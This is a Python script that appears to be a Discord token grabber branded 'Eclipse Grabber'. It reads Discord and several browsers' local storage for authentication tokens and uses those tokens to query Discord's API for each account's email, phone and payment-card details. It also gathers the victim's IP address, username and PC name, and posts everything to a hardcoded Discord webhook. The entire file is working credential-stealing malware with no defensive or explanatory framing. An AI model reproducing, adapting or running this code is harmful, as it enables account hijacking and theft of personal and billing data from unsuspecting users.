import os
import ssl
from getpass import getuser
from json import dumps, loads
from platform import node as get_pc_name
from re import findall
from sys import platform as OS
from typing import List, Optional, Dict, Set, Union
from urllib.request import Request, urlopen
import base64
import json
import urllib.request

# Constants
WEBHOOK = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"
IPIFY_API_URL = "https://api.ipify.org?format=json"
DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.11 (KHTML, like Gecko) "
    "Chrome/23.0.1271.64 Safari/537.11"
)
CONTENT_TYPE = "application/json"
TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}

ssl._create_default_https_context = ssl._create_unverified_context

def pc_info():
    api_resp = open_url(IPIFY_API_URL)
    return (
        f'IP: {api_resp.get("ip") if api_resp else None}\n'
        f"Username: {getuser()}\n"
        f"PC Name: {get_pc_name()}\n"
    )

def get_paths() -> dict:
    if OS == "win32":  # Windows
        local_app_data = os.getenv("LOCALAPPDATA")
        app_data = os.getenv("APPDATA")
        chromium_path = ["User Data", "Default"]
    elif OS == "darwin":  # OSX
        local_app_data = os.path.expanduser("~/Library/Application Support")
        app_data = os.path.expanduser("~/Library/Application Support")
        chromium_path = ["Default"]
    else:
        return {}

    paths = {
        "Discord": [app_data, "Discord"],
        "Discord Canary": [app_data, "discordcanary"],
        "Discord PTB": [app_data, "discordptb"],
        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
        "Opera": [app_data, "Opera Software", "Opera Stable"],
    }

    for app_name, path in paths.items():
        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")

    return paths

def open_url(url: str, token: Optional[str] = None, data: Optional[bytes] = None) -> Optional[dict]:
    headers = {
        "Content-Type": CONTENT_TYPE,
        "User-Agent": USER_AGENT,
    }

    if token:
        headers.update({"Authorization": token})
    try:
        result = urlopen(Request(url, data, headers)).read().decode().strip()
        if result:
            return loads(result)
    except Exception:
        pass

class Account:
    def __init__(self, token: str, token_location: str):
        self.token = token
        self.token_location = token_location
        self.account_data = open_url(DISCORD_API_URL, self.token)
        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)

        if self.account_data:
            self.name = self.account_data.get("username")
            self.discriminator = self.account_data.get("discriminator")
            self.id = self.account_data.get("id")
            self.avatar_url = DISCORD_AVATAR_URL.format(
                id=self.id, avatar_id=self.account_data.get('avatar')
            )

    def account_info(self) -> str:
        if not self.account_data:
            return "None"

        return (
            f"Email: {str(self.account_data.get('email'))}\n"
            f"Phone: {str(self.account_data.get('phone'))}\n"
            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
        )

    def billing_info(self) -> List[str]:
        if not self.billing_data:
            return "None"

        info = []

        for bill in self.billing_data:
            info.append(
                f"Id: {str(bill.get('id'))}\n"
                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
                f"Invalid: {str(bill.get('invalid'))}\n"
                f"Brand: {str(bill.get('brand')).capitalize()}\n"
                f"Last digits: {str(bill.get('last_4'))}\n"
                f"Expires: {str(bill.get('expires_month'))}"
                f"/{str(bill.get('expires_year'))}\n"
                f"Country: {str(bill.get('country'))}"
            )
        return info

def field(title: str, text: str, inline: bool = True) -> str:
    return {
        "name": f"**{title} Info**",
        "value": str(text),
        "inline": bool(inline)
    }

def embed_info(accounts: Dict[str, Account]) -> List[dict]:
    embeds = []
    for account in accounts.values():
        fields = [
            field("Account", account.account_info()),
            field("PC", pc_info()),
            field("Token", account.token, False)
        ]

        if account.billing_data:
            fields.insert(-1, field("Billing", account.billing_info()[0]))

        embeds.append({
            "color": 0x6A5ACD,
            "fields": fields,
            "footer": {"text": "Made by @3ct0s and @JM1k1"},
            "author": {
                "name": (
                    f"{account.name}#{account.discriminator} "
                    f"({account.id})"
                ),
                "icon_url": account.avatar_url
            }
        })
    return embeds

def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Eclipse Grabber",
        "avatar_url": "https://imgur.com/Ymo8GEe.png"
    }

    data = dumps(webhook).encode()
    return open_url(WEBHOOK_URL, None, data)

def get_tokens(path: str) -> List[str]:
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        try:
            with open(os.path.join(path, file_name), errors="ignore") as content:
                for line in map(str.strip, content.readlines()):
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                                  r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
        except Exception:
            continue
    return tokens

def get_accounts(paths: dict) -> dict:
    accounts = {}

    for app_name, path in paths.items():
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            account = Account(token, app_name)
            if account.account_data and account.id not in accounts.keys():
                accounts.update({account.id: account})
    return accounts

def make_post_request(api_url: str, data: Dict[str, str]) -> int:
    request = urllib.request.Request(
        api_url, data=json.dumps(data).encode(),
        headers=REQUEST_HEADERS
    )

    with urllib.request.urlopen(request) as response:
        response_status = response.status

    return response_status

def get_tokens_from_file(file_path: str) -> Union[List[str], None]:
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
            file_contents = text_file.read()
    except (PermissionError, FileNotFoundError):
        return None

    tokens = findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens if tokens else None

def get_user_id_from_token(token: str) -> Union[None, str]:
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except (UnicodeDecodeError, IndexError):
        return None

    return discord_user_id

def get_tokens_from_path(base_path: str) -> Union[Dict[str, Set[str]], None]:
    try:
        file_paths = [
            os.path.join(base_path, filename) for filename in os.listdir(base_path)
        ]
    except FileNotFoundError:
        return None

    id_to_tokens: Dict[str, Set[str]] = dict()

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens if id_to_tokens else None

def send_tokens_to_webhook(
    webhook_url: str, user_id_to_token: Dict[str, Set[str]]
) -> int:
    fields: List[Dict] = list()

    for user_id, tokens in user_id_to_token.items():
        fields.append({
            "name": user_id,
            "value": "\n".join(tokens)
        })

    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}

    return make_post_request(webhook_url, data)

def main(WEBHOOK_URL: str):
    paths = get_paths()
    accounts = get_accounts(paths)
    embeds = embed_info(accounts)
    send_webhook(embeds, WEBHOOK_URL)

    chrome_path = os.path.join(
        os.getenv("LOCALAPPDATA"),
        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
    )

    tokens = get_tokens_from_path(chrome_path)

    if tokens is None:
        return

    send_tokens_to_webhook(WEBHOOK_URL, tokens)

if __name__ == "__main__":
    main(WEBHOOK) # Run the main function
